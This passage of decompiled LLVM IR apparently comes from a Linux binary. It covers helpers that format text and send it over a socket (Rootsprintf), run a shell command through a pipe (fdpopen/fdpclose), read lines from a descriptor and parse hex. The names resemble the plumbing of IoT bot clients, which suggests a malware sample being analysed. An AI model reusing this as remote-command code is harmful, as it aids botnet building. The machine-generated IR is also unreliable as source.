  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 7, 54, 55, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 56, 57, 58, 59, 60, 61, 62, 63, 64, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 39, 0, 3, 44, 45, 2, 4, 46, 47, 48, 49, 50, 51, 52, 53, 65, 1 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_805c4e0.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v0_804893a = call i32 @getdtablesize()
  %tmp37 = icmp slt i32 %v0_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v0_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_805c4e0.13, align 32
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v0_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v0_8048998 = call i32 @__vfork()
  %v13_80489a6 = icmp eq i32 %v0_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v0_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805533a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8055337.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8055334.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_805c4e0.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v0_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_805c4e0.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_805c4e0.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_805c4e0.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805c4e0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd55 = ptrtoint i8* %arg1 to i32
  %v2_8048cd86 = load i8, i8* %arg1, align 1
  %v4_8048cda10 = icmp eq i8 %v2_8048cd86, 0
  br i1 %v4_8048cda10, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.011, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.012, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8055360.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd513, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
